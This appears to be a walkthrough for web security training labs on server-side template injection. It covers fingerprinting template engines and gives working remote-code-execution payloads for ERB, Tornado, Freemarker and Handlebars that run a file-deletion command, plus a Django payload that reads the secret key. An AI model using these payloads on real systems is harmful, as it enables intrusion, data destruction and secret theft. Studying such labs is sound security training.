**Step 1 — Find the injection point**

- Log in and browse the site. Look for:
    - A `?message=` or similar URL parameter whose value is reflected on the page
    - A "preferred name" / display name setting in your account
    - A blog/product template editor (log in as `content-manager:C0nt3ntM4n4g3r` if no `wiener:peter` login exists)
- Inject the fuzz string `${{<%[%'"}}%\` into any reflected parameter — a verbose error will usually name the engine directly.
- If no error, test math payloads and look for `49` in the response:

|Payload|Engine if `49` returned|
|---|---|
|`<%= 7*7 %>`|ERB (Ruby)|
|`{{7*7}}`|Tornado (Python)|
|`${7*7}`|Freemarker (Java)|
|`${{<%[%'"}}%\` → Handlebars error|Handlebars (Node.js)|
|`${{<%[%'"}}%\` → Django error|Django (Python)|

---

**If `?message=` param + ERB error → Basic SSTI (ERB/Ruby)**

- Confirm with `<%= 7*7 %>` → `49` in response
- Send the RCE payload as the `message` parameter (URL encoded):

```
  https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

- Load the URL → lab solved ✅

---

**If preferred name setting + Tornado error on comment → Basic SSTI (code context)**

- In Burp, find `POST /my-account/change-blog-post-author-display` → send to Repeater
- Confirm injection by setting `blog-post-author-display=user.name}}{{7*7}}` → post a comment → username shows `Peter Wiener49}}`
- Set the RCE payload as the parameter value (URL encoded):

```
  blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

- Reload the page containing your comment to trigger execution → lab solved ✅

---

**If blog/product template editor + Freemarker error → SSTI using documentation**

- Log in as `content-manager:C0nt3ntM4n4g3r` → edit a product description template
- Change an existing expression to `${foobar}` → save → error confirms **Freemarker**
- Replace the invalid expression with the RCE payload:

```
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

- Save the template and view the product page → lab solved ✅

---

**If `?message=` param + Handlebars error → Unknown language with documented exploit**

- Inject `${{<%[%'"}}%\` into the `message` parameter → error identifies **Handlebars**
- URL encode and send this payload as the `message` value:

```
  wrtz{{#with "s" as |string|}}
  {{#with "e"}}
  {{#with split as |conslist|}}
  {{this.pop}}
  {{this.push (lookup string.sub "constructor")}}
  {{this.pop}}
  {{#with string.split as |codelist|}}
  {{this.pop}}
  {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
  {{this.pop}}
  {{#each conslist}}
  {{#with (string.sub.apply 0 codelist)}}
  {{this}}
  {{/with}}
  {{/each}}
  {{/with}}
  {{/with}}
  {{/with}}
  {{/with}}
```

💡 Use Burp's URL encoder or the pre-encoded URL from the lab solution page

- Load the URL → lab solved ✅

---

**If blog/product template editor + Django error → SSTI with information disclosure**

- Log in as `content-manager:C0nt3ntM4n4g3r` → edit a product description template
- Inject `${{<%[%'"}}%\` → save → error confirms **Django**
- First, enter `{% debug %}` and save — confirm you can see the `settings` object in the output
- Replace with the secret key extraction payload:

```
  {{settings.SECRET_KEY}}
```

- Save the template → copy the secret key from the output → click **Submit solution** → lab solved ✅